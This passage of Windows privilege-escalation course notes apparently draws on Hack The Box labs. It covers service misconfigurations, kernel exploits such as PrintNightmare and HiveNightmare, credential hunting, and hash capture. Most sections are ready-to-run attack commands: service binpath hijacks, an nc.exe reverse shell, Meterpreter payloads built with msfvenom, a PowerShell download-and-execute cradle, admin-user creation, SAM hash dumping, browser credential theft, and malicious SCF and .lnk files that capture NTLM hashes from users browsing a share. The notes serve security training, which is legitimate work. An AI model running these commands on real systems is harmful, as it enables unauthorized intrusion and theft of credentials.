  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

##### Checking Permissions with AccessChk

Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

``` batch
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

##### Changing the Service Binary Path

We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

``` batch
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

``` batch
C:\htb> sc stop WindscribeService
```

Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.

``` batch
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```



#### Unquoted Service Path

Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

##### Explanation

``` batch
C:\htb> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.

- `C:\Program.exe\`
- `C:\Program Files (x86)\System.exe`

However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.

##### Searching for Unquoted Service Paths

``` batch
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```




#### Permissive Registry ACLs

It is also worth searching for weak service ACLs in the Windows Registry. We can do this using `accesschk`.

##### Checking for Weak Service ACLs in Registry

``` batch
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

##### Abuse Weak Service ACLs in Registry by Changing ImagePath with PowerShell

We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
#### Modifiable Registry Autorun Binary

##### Check Startup Programs

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```powershell
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

This [post](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.


### Kernel Exploits

#### MS08-067 

This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. 

Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a "legacy" vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.


#### MS17-010 - EternalBlue

[EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) box on Hack The Box, again from the remote standpoint.

#### ALPC Task Scheduler 0-Day

The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to `.job` files located in the `C:\Windows\tasks` directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). The Hack The Box box [Hackback](https://snowscan.io/htb-writeup-hackback/) can be used to try out this privilege escalation exploit.

#### CVE-2021-36934 HiveNightmare, aka SeriousSam 

Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. 

More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.

##### Checking Permissions on the SAM File

We can check for this vulnerability using `icacls` to check permissions on the SAM file. In our case, we have a vulnerable version as the file is readable by the `BUILTIN\Users` group.

``` batch
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Users:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

##### Performing Attack and Parsing Password Hashes

This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:

```powershell
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
```

These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:

```shell-session
PrinceAli1@htb[/htb]$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

#### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. 

The flaw allowed any authenticated user to add a print driver to a Windows system **without having the privilege** mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare." 

Microsoft released a [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly.

[This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

##### Checking for Spooler Service

We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.

```powershell
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

##### Adding Local Admin with PrintNightmare PowerShell PoC

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

Now we can import the PowerShell script and use it to add a new local admin user.

```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

If all went to plan, we will have a new local admin user under our control.

```powershell
PS C:\htb> net user hacker
```



#### CVE-2020-0668 Example

[Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), which exploits an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a `.OLD` extension when the service is triggered. This move operation is performed by `NT AUTHORITY\SYSTEM`, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

##### After Building Solution

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

**Note**: We can use the exploit to create a file of our choosing in a protected folder such as C:\\Windows\\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

##### Checking Permissions on Binary

`icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)` in the command output.


``` batch
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe 
NT AUTHORITY\SYSTEM:(I)(F)                                                         BUILTIN\Administrators:(I)(F)                                                      BUILTIN\Users:(I)(RX)                                                              APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

##### Generating Malicious Binary

Let's generate a malicious `maintenanceservice.exe` binary that can be used to obtain a Meterpreter reverse shell connection from our target.

```shell-session
PrinceAli1@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

##### Downloading the Malicious Binary

**For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.**

We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.

```powershell
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

##### Running the Exploit

Next, let's run the exploit. It accepts two arguments, the source and destination files.

``` batch
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       
```

##### Checking Permissions of New File

The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.

``` batch
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe 
NT AUTHORITY\SYSTEM:(F)                                                            BUILTIN\Administrators:(F)                                                         WINLPE-WS02\htb-student:(F)
```

##### Replacing File with Malicious Binary

We can overwrite the `maintenanceservice.exe` binary in `c:\Program Files (x86)\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`. Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start.

**The `copy` command will only work from a cmd.exe window, not a PowerShell console.**

``` batch
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

##### Getting Reverse Shell

Launch Metasploit using the below commands.

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

Start the service, and we should get a session as `NT AUTHORITY\SYSTEM`.

``` batch
C:\htb> net start MozillaMaintenance 

The service is not responding to the control function

More help is available by typing NET HELPMSG 2186
```

We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.

```shell-session
meterpreter > hashdump
```


### Vulnerable Services

Enumeration -> System Information -> Installed Programs

#### Druva inSync Windows Client Local Privilege Escalation Example

For our purposes, we want to modify the `$cmd` variable to our desired command. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. 

Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.

### DLL Injection

For another day..

## **Credential Hunting**

### Application Configuration Files

```powershell
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.
#### Dictionary Files

```powershell
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```
#### Unattended Installation Files

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

#### PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

- `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

##### Confirming PowerShell History Save Path

```powershell
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

##### Reading PowerShell History File

```powershell
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
```

We can also use this one-liner to retrieve the contents of **all Powershell history files that we can access as our current user.** This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.

```powershell
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### PowerShell Credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former.

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

### Other Files

In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic `passwords.txt` file.

#### Manually Searching the File System for Credentials

We can search the file system or share drive(s) manually using the following commands from [this cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/).

##### Search File Contents for String

``` batch
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

``` batch
C:\htb> findstr /si password *.xml *.ini *.txt *.config
```

``` batch
C:\htb> findstr /spin "password" *.*
```

```powershell
PS C:\htb> select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

##### Search for File Extensions

``` batch
C:\htb> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

``` batch
C:\htb> where /R C:\ *.config
```

```powershell
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

#### Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

```powershell
PS C:\htb> ls
 
Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

![image](https://academy.hackthebox.com/storage/modules/67/stickynote.png)

##### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [PSSQLite module](https://github.com/RamblingCookieMonster/PSSQLite). First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the `Note` table and look for any interesting data. This can also be done from our attack machine after downloading the `.sqlite` file or remotely via WinRM.

```powershell
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
##### Viewing Sticky Notes Data Using String Command

We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

```shell-session
PrinceAli1@htb[/htb]$  strings plum.sqlite-wal
```

#### Other Files of Interest

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Further Credential Theft

#### Cmdkey Saved Credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.

``` batch
C:\htb> cmdkey /list

Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

```powershell
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

#### Browser Credentials

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell
PS C:\htb> .\SharpChrome.exe logins /unprotect
```

#### Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

#### LaZagne

When all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.).

```powershell
PS C:\htb> .\lazagne.exe all
```

#### SessionGopher

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find.

We need local admin access to retrieve stored session information for every user in `HKEY_USERS`, but it is **always worth running as our current user to see if we can find any useful credentials.**

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

#### Windows AutoLogon

Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text.

``` batch
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Putty

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

Note that the access controls for this specific registry key are tied to the user account that configured and saved the session. Therefore, in order to see it, we would need to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if we had admin privileges, we would be able to find it under the corresponding user's hive in `HKEY_USERS`.

First, we need to enumerate the available saved sessions:

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Next, we look at the keys and values of the discovered session "`kali%20ssh`":

```powershell
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

#### Wifi Passwords

If we obtain **local admin access** to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

``` batch
C:\htb> netsh wlan show profile
```

``` batch
C:\htb> netsh wlan show profile ilfreight_corp key=clear
```

## **Citrix Breakout**

To Be Updated..
## **Additional Techniques**
### Interacting with Users

#### Traffic Capture

If `Wireshark` is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.

#### Process Command Lines

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. **It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.**

```shell-session
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

We can host the script on our attack machine and execute it on the target host as follows.

```powershell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

#### SCF on a File Share

An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation.

create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.

**Using SCFs no longer works on Server 2019 hosts**

```shell-session
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

```shell-session
PrinceAli1@htb[/htb]$ sudo responder -wrf -v -I tun0
```

```shell-session
PrinceAli1@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

#### Capturing Hashes with a Malicious .lnk File

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:

```powershell

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Pillaging

Enumeration -> System Information -> Installed Programs

#### mRemoteNG

